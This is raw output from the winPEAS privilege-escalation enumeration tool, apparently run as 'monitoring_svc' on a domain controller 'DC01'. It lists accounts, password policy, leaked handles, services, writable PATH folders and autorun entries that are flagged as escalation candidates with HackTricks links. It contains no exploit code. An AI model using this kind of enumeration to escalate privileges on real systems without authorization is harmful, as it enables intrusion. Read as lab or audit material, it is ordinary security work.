   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   4/2/2025 5:38:45 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   web_svc
   User Id                 :   1103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   11/12/2025 6:38:48 PM
   Logons Count            :   927
   Password Last Set       :   4/9/2025 2:59:38 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   monitoring_svc
   User Id                 :   3101
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   11/12/2025 6:32:39 PM
   Logons Count            :   3
   Password Last Set       :   11/12/2025 6:38:55 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\monitoring_svc : monitoring_svc [AllAccess]
    C:\Users\Public
    C:\Users\web_svc

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  NANOCORP

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: NANOCORP
    SID: S-1-5-21-2261381271-1331810270-697239744
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
    Handle: 1424(key)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\.netframework
   =================================================================================================

    Handle: 2080(file)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: AllAccess
    File Path: \Windows\System32\en-US\KernelBase.dll.mui
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2104(key)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1424(key)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\.netframework
   =================================================================================================

    Handle: 2080(file)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: AllAccess
    File Path: \Windows\System32\en-US\KernelBase.dll.mui
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2104(key)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1424(key)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\.netframework
   =================================================================================================

    Handle: 2080(file)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: AllAccess
    File Path: \Windows\System32\en-US\KernelBase.dll.mui
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2104(key)
    Handle Owner: Pid is 5372(winPEASx64) with owner: monitoring_svc
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.                                                                                                                  

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                  
  [X] Exception: Access denied 
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(Marvell Semiconductor Inc. - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(Marvell Semiconductor Inc. - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot
   =================================================================================================

    Checkmk Service(tribe29 GmbH - Checkmk Service)["C:\Program Files (x86)\checkmk\service\check_mk_agent.exe"] - Autoload
    Checkmk monitoring agent service - 2.1, 64-bit
   =================================================================================================               

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i68x64.sys] - System                                                                  
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(Marvell Semiconductor Inc. - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @netevbd0a.inf,%vbd_srv_desc%;QLogic Legacy Ethernet Adapter VBD(QLogic Corporation - @netevbd0a.inf,%vbd_srv_desc%;QLogic Legacy Ethernet Adapter VBD)[System32\drivers\evbd0a.sys] - Boot
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System                                                                                                    
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    NDKPerf Driver(NDKPerf Driver)[system32\drivers\NDKPerf.sys] - System
   =================================================================================================

    @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver(VMware, Inc. - @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver)[System32\drivers\pvscsi.sys] - Boot
   =================================================================================================

    @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD(Marvell Semiconductor Inc. - @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD)[System32\drivers\qevbda.sys] - Boot
   =================================================================================================

    @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver(Marvell Semiconductor Inc. - @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver)[System32\drivers\qefcoe.sys] - Boot
   =================================================================================================

    @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver(Marvell Semiconductor Inc. - @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver)[System32\drivers\qeois.sys] - Boot
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(Marvell Semiconductor Inc. - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot                                                                                                   
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================               

    @Usb4HostRouter.inf,%Usb4HostRouter.SVCDESC%;USB4 Host Router Service(@Usb4HostRouter.inf,%Usb4HostRouter.SVCDESC%;USB4 Host Router Service)[C:\Windows\System32\drivers\Usb4HostRouter.sys] - System
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System                                                                  
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload                                                
    Alias Manager and Ticket Service
   =================================================================================================               

    @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload
    @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================               

    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    VMware Host Guest Client Redirector(VMware, Inc. - VMware Host Guest Client Redirector)[system32\DRIVERS\vmhgfs.sys] - System                                                                                                     
    Implements the VMware HGFS protocol. This protocol provides connectivity to host files provided by the HGFS server.                                                                                                               
   =================================================================================================               

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================               

    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Physical Disk Helper(VMware, Inc. - VMware Physical Disk Helper)[C:\Windows\system32\DRIVERS\vmrawdsk.sys] - System                                                                                                        
    VMware Physical Disk Helper
   =================================================================================================               

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================               

    @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System
   =================================================================================================

    @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================               

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\Windows\System32\drivers\vwifibus.sys] - System                                                                             
    @%SystemRoot%\System32\drivers\vwifibus.sys,-258
   =================================================================================================               

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System                                                                                           
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================               

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                                       
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions                                                                    
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking                                                                                              
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                                                                                                
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell
    C:\Program Files\WinRAR


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                 
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied 
   at System.Management.ThreadDispatch.Start()                                                                     
   at System.Management.ManagementScope.Initialize()                                                               
   at System.Management.ManagementObjectSearcher.Initialize()                                                      
   at System.Management.ManagementObjectSearcher.Get()                                                             
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()                                                      

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: AzureArcSetup
    Folder: C:\Windows\AzureArcSetup\Systray
    File: C:\Windows\AzureArcSetup\Systray\AzureArcSysTray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: *kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit64
    Folder: None (PATH Injection)
    File: xtajit64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


